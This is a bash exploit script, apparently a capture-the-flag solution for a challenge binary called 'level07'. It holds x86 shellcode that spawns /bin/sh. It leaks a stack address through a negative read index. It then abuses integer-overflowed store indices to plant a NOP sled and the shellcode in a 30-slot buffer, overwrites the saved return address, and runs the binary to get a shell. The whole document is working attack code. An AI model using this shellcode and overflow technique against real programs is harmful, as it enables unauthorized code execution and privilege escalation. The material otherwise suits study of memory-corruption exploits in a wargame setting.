#!/bin/bash

PATH_LEVEL07="/home/users/level07/level07"
SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
SHELLCODE_LENGTH=$(echo -n $SHELLCODE | /usr/bin/wc -c)
SHELLCODE_BYTES_LENGTH=$(($(echo -n "${SHELLCODE//\\x}" | /usr/bin/wc -c) / 2))

OVERFLOW=1073741824
INDEX_OLD_EIP=1073741938
INDEX_SHELLCODE_ADDRESS=-9
PAYLOAD_LEVEL07=""

BUFF_SIZE=30

SHELLCODE_LENGTH_INT=$(($SHELLCODE_BYTES_LENGTH / 4))
if [ $(($SHELLCODE_BYTES_LENGTH % 4)) -ne "0" ]; then
	SHELLCODE_LENGTH_INT=$(($SHELLCODE_LENGTH_INT + 1))
fi

PADDING_NOP=$(( $BUFF_SIZE - $SHELLCODE_LENGTH_INT ))

if [[ $BUFF_SIZE -lt $SHELLCODE_LENGTH_INT ]]; then
	echo "Buffer not large enougth to hold shellcode"
	exit 1
fi

# echo "Padding nop -> $PADDING_NOP"

for((i = 0; i < $BUFF_SIZE; i++)); do
	PAYLOAD_LEVEL07+="store\n"

	if [[ $i -lt $PADDING_NOP ]]; then
		PAYLOAD_LEVEL07+="2425393296"
	else
		SHELLCODE_SUBSTR=$(echo -n ${SHELLCODE:$((($i - $PADDING_NOP) * 16)):16})
		# echo $SHELLCODE_SUBSTR
		ARR_BYTES=(${SHELLCODE_SUBSTR//\\x/ })
		NB=""
		for j in "${ARR_BYTES[@]}"
		do
			NB=$j$NB
		done
		NB="0x$NB"
		PAYLOAD_LEVEL07+='" + str(int("'$NB'", 16)) + "'
	fi

	if [ $(($i % 3)) -eq "0" ]; then
		PAYLOAD_LEVEL07+="\n"$(($i + $OVERFLOW))"\n"
	else
		PAYLOAD_LEVEL07+="\n$i\n"
	fi
done

SHELLCODE_ADDRESS=$($PATH_LEVEL07 < <(printf "read\n$INDEX_SHELLCODE_ADDRESS\nquit\n") | grep 'Input command:' | awk '{print $8}')
PAYLOAD_LEVEL07+="store\n$SHELLCODE_ADDRESS\n$INDEX_OLD_EIP\nquit\n"
#echo $PAYLOAD_LEVEL07
#python -c "print(\"$PAYLOAD_LEVEL07\")" > /tmp/e
cat <(python -c "print(\"$PAYLOAD_LEVEL07\")") - | $PATH_LEVEL07